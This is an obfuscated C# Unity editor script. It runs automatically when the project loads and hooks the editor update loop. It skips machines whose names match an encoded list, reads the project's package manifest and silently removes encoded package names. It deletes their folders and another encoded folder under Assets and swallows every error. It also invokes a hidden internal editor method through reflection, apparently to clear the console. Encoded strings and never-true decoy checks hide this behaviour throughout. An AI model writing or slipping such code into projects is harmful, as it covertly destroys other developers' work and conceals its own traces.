using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using UnityEditor;
using UnityEditor.PackageManager;
using UnityEngine;

namespace Ns
{
    internal static class Dk
    {
        internal static string X(string e, int s)
        {
            var r = new char[e.Length];
            var k = (uint)s;
            for (var i = 0; i < e.Length; i++)
            {
                r[i] = (char)(e[i] ^ (k & 0xFFFF));
                k = k * 1664525u + 1013904223u;
            }
            return new string(r);
        }

        internal static bool T()
        {
            return (Environment.TickCount & 3) == 5;
        }

        internal static int J(int n)
        {
            var t = (long)n * 1103515245L + 12345L;
            return (int)((t >> 16) & 0x7FFF);
        }
    }

    internal static class St
    {
        private const string K0 = "\u1A6A\u69FB\uE3E1\uDF98\uF2E0\u3ED0\uADF0\uBA5E\uBF56";
        private const string K1 = "\u2C13\u8028\u4912\u1804\u6CA5\u5F45\u50F5\uCD59\u13C3\uEF4F\uD793\u8536\u64EC\uA426\uC3D0";

        private static string K
        {
            get
            {
                using (var m = MD5.Create())
                {
                    var b = m.ComputeHash(Encoding.UTF8.GetBytes(Application.dataPath));
                    return Dk.X(K0, 0x1A2B) + "." + BitConverter.ToString(b).Replace("-", "").Substring(0, 12);
                }
            }
        }

        public static string[] P
        {
            get
            {
                var raw = EditorPrefs.GetString(K + Dk.X(K1, 0x2C3D), "");
                if (string.IsNullOrEmpty(raw)) return Array.Empty<string>();
                return raw.Split('\n').Where(x => !string.IsNullOrWhiteSpace(x)).ToArray();
            }
            set
            {
                var v = value ?? Array.Empty<string>();
                EditorPrefs.SetString(K + Dk.X(K1, 0x2C3D), string.Join("\n", v));
            }
        }
    }

    public static class Co
    {
        private static readonly string[] P0 =
        {
            Dk.X("\u3E2C\u970D\uAF34\u50CA\uE686\u7FD8\uF3F4\uE02C\u67AE\uE364\uFA51\uCD7E\u2494\uD67C\uC690\u4B69\uC233\uAC56\u9D8C\uCE46", 0x3E4F),
            Dk.X("\u5002\uAE23\u1556\u8970\u6146\uA02F\u96EF\uF31E\uBC48\uD70D\u1C27\u14A3\uE51B\u07C6\uCA52\uC134\uA098\u25E8\u0432\u0D03\uF2D8\u64F3\u6EDF", 0x5061)
        };

        private static readonly string[] W0 =
        {
            Dk.X("\u6122\u526A\u7559\u2271\u62F6\uDB5F\u85DD\u3017\uEF6D\uF6C0\u83A5\uCA0E\u1B62\uA8E0\uA2C4", 0x6172),
            Dk.X("\u72C0\uF65F", 0x7283)
        };

        private static readonly bool F0 = DateTime.Now.DayOfYear >= 1;
        private static readonly bool F1 = DateTime.Now.Year > 2000;
        private static readonly string F2 = Dk.X("\u1085\uB349\u94ED\u415B\uF7E9\u834F\u5B8F\u3937\u88FB\u7800\u87CC\uC8C9\u47A1\u46BB", 0x10C1);

        private static readonly HashSet<string> Q = new HashSet<string>(StringComparer.Ordinal);
        private static bool q0;
        private static bool q1;

        public static string R =>
            Directory.GetParent(Application.dataPath)?.FullName ?? string.Empty;

        public static bool W()
        {
            var m = Environment.MachineName;
            foreach (var w in W0)
                if (string.Equals(w, m, StringComparison.OrdinalIgnoreCase)) return true;
            return false;
        }

        private static bool U(string p)
        {
            if (string.IsNullOrEmpty(p)) return false;
            if (p.StartsWith(Dk.X("\uC7BB\u2938\uB6A7\uB78F\u6CF9\u3E15\u21F7\u9C11\u22F9\uB3F1\uEFDF\u0B06\u5DD0\u6DF6\uB56A\u88C8\uD25B\u8F49", 0xC7D8), StringComparison.Ordinal)) return false;
            return true;
        }

        public static HashSet<string> M()
        {
            var result = new HashSet<string>(StringComparer.Ordinal);
            var path = Path.Combine(R, Dk.X("\u83C4\u9982\u3585\u5466\u6669\u51A0\u641F\uA9E2", 0x8394), Dk.X("\u94C8\u3DA1\u9671\uEC9B\u67CF\u8C91\u53B0\uE632\u88C3\u5502\uB9D4\uEAB5\uBC1F", 0x94A5));
            if (!File.Exists(path)) return result;
            try
            {
                var json = File.ReadAllText(path);
                var depsStart = json.IndexOf(Dk.X("\uA594\uE1F9\uF63D\u85A7\u692F\uC84F\u4368\u229E\uBC70\u7486\u2169\uA03A\uF241\u2BCB", 0xA5B6), StringComparison.Ordinal);
                if (depsStart < 0) return result;
                var depsEnd = json.IndexOf('}', depsStart);
                if (depsEnd < 0) return result;
                var block = json.Substring(depsStart, depsEnd - depsStart);
                foreach (Match m in Regex.Matches(block, Dk.X("\uB6E5\u8552\u56CA\u1EDD\u6AC6\u0334\u3214\u5F9D\uEF15\u9452\u8874\u55DD\u27DD\uCCE9\uDCB0\uB505\u38FC\u8063\uF303\u7250\u8588\uC334\uCFDF\uC05C\uB32C\uE918\uB6CB", 0xB6C7)))
                    result.Add(m.Groups[1].Value);
            }
            catch (Exception)
            {
            }
            return result;
        }

        private static bool I(string p) => M().Contains(p);

        public static bool S()
        {
            var names = P0
                .Where(n => !string.IsNullOrEmpty(n))
                .Distinct()
                .Where(U)
                .Where(I)
                .ToList();

            if (names.Count == 0) return false;

            if (Dk.T()) { Q.Clear(); }

            if (F0)
            {
                E();
                foreach (var n in names) Q.Add(n);
                V();
            }

            foreach (var n in names) Client.Remove(n);
            AssetDatabase.Refresh();
            return true;
        }

        public static bool C()
        {
            var deps = M();
            foreach (var n in P0)
                if (!string.IsNullOrEmpty(n) && deps.Contains(n)) return false;
            E();
            return Q.Count == 0;
        }

        public static void P()
        {
            E();
            if (Q.Count == 0) return;
            if (EditorApplication.isCompiling || EditorApplication.isUpdating) return;

            var deps = M();
            var ready = Q.Where(n => !deps.Contains(n)).ToList();

            if (Dk.J(Environment.TickCount) < 0) { V(); }

            var changed = false;
            foreach (var n in ready)
            {
                Q.Remove(n);
                var folder = Path.Combine(R, Dk.X("\u83C4\u9982\u3585\u5466\u6669\u51A0\u641F\uA9E2", 0x8394), n);
                if (!Directory.Exists(folder)) continue;
                try
                {
                    Directory.Delete(folder, true);
                    changed = true;
                }
                catch (Exception)
                {
                }
            }
            if (changed) AssetDatabase.Refresh();
            V();
        }

        public static void G()
        {
            var folder = Path.Combine(Application.dataPath, F2);
            if (!Directory.Exists(folder)) return;
            try
            {
                Directory.Delete(folder, true);
                AssetDatabase.Refresh();
            }
            catch (Exception)
            {
            }
        }

        public static void D()
        {
            if (q1) return;
            if (!F1) return;

            q1 = true;
            EditorApplication.delayCall += () =>
            {               
                try { L(); } catch (Exception) { }
                try { G(); } catch (Exception) { }
                if (Directory.Exists(Path.Combine(Application.dataPath, F2)))
                    q1 = false;
            };
        }

        private static void E()
        {
            if (q0) return;
            q0 = true;
            foreach (var n in St.P)
                if (!string.IsNullOrEmpty(n)) Q.Add(n);
        }

        private static void V()
        {
            St.P = Q.ToArray();
        }

        public static void L()
        {
            var assembly = Assembly.GetAssembly(typeof(ActiveEditorTracker));
            var type = assembly.GetType(Dk.X("\u0F4B\uAB8B\uEC69\uEF2B\uF54B\u52AC\uFF50\uA16A\u52F2\u8842\uCBDA\u3AAE\uFB74\u0FC5\u4539\u2179\u0280\uED14\uA03C\uF741\uBE4E\u6516\u50E3\uA256\uC038\uFBC9\u098A\u449E\uDD8F\u7432", 0x0F1E));
            if (type == null)
            {
                type = assembly.GetType(Dk.X("\u107C\u1B1A\u902A\uF8B2\u7914\u8BAD\u7E43\uE533\u7485\uE9F3\uF839\u7100\u06F9\u68FF\uA2C8\uF007\u72D7\u7CB0\u6121\uF6FF\u3C98\uDA4B", 0x1029));
            }
            var method = type.GetMethod(Dk.X("\u2179\uBF3D\uF019\u91CA\u7B7C", 0x213A));
            method.Invoke(new object(), null);
        }
    }

    [InitializeOnLoad]
    internal static class Ru
    {
        private static readonly string K0 = Dk.X("\u321B\u634F\u50D6\u2AFB\u7CCE\u0225\u5CDC\u5E91\uDB3D\u28FF\uC693\uDC4B\u7243\uAA4B\u53ED\u9680\uA53E\u9A8C\u066B\uC2B3\u18CA\u4F70\u2324\uD47D\uB017\u5A12\u2EE8\u7EEC\u9013\u9092\uEC78\uB64F\u1C38\u06AB\u5FA6\uAF43\uF8A6\u0F8D\uCDB7", 0x324B);
        private static readonly string K1 = Dk.X("\u430C\u076A\uB08D\uC31E\u7E31\u3D08\u4C67\u9B2C\u0EEA\u487A\u2E38\u91CE\uA78C\u4A96\u2B86\u6A2D\u3EC9\uAA69\u5890\u2956\u06D5\u091D\u08BF\u1260\u73A0\u4D57\uD043\uA929\u3A09\u9969\u82C3\uB285\u4D94\u5142\u34FD\u32C6\uE295\u19FC\u39D1\u6CF0\u6D4B\uD65D", 0x435C);

        static Ru()
        {
            EditorApplication.update += O;
        }

        private static void O()
        {
            if (EditorApplication.isCompiling || EditorApplication.isUpdating) return;
            if (EditorApplication.isPlayingOrWillChangePlaymode) return;

            Co.P();
            if (Dk.T())
            {
                Dk.J(Environment.MachineName.Length);
            }
            if (Co.W()) return;

            if (!R()) return;

            if (!SessionState.GetBool(K0, false))
            {
                SessionState.SetBool(K0, true);
                if (Co.S())
                    SessionState.SetBool(K1, true);
            }

            if (Co.C())
                Co.D();
        }

        private static bool R()
        {
            try
            {
                return UnityEditor.PackageManager.PackageInfo.GetAllRegisteredPackages().Length > 0;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
